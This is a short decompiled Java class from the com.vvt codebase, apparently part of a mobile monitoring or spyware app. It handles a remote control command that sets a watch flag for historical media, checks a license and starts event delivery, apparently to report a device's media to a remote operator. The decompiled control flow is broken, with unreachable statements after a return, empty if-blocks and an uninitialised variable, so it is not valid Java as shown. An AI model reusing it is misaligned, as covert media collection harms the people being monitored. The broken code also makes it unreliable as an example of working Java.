package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.eventdelivery.f;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefMediaHistorical;
import com.vvt.remotecontrol.ControlCommand;
import java.util.List;

public class as
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject1 = paramh.n;
    Object localObject2 = FxPreferenceType.MEDIA_HISTORICAL;
    localObject2 = (PrefMediaHistorical)((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
    Object localObject3 = paramControlCommand.getData();
    boolean bool1 = localObject3 instanceof Integer;
    boolean bool4;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      int i = ((Integer)localObject3).intValue();
      ((PrefMediaHistorical)localObject2).setWatchFlag(i);
      ((com.vvt.preference.b)localObject1).b();
      localObject2 = i.b(paramh).b();
      localObject3 = paramh.k;
      localObject1 = paramh.o;
      String str = paramh.l.d();
      boolean bool2 = ((com.vvt.license.b)localObject3).a((com.vvt.productinfo.a)localObject1, str);
      boolean bool3 = a;
      if (bool3) {}
      i.d(paramh, (List)localObject2, bool2);
      bool4 = a;
      if (bool4) {}
      localObject2 = paramh.i;
      ((f)localObject2).a();
      bool4 = true;
    }
    for (;;)
    {
      return bool4;
      bool4 = false;
      localObject2 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/as.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */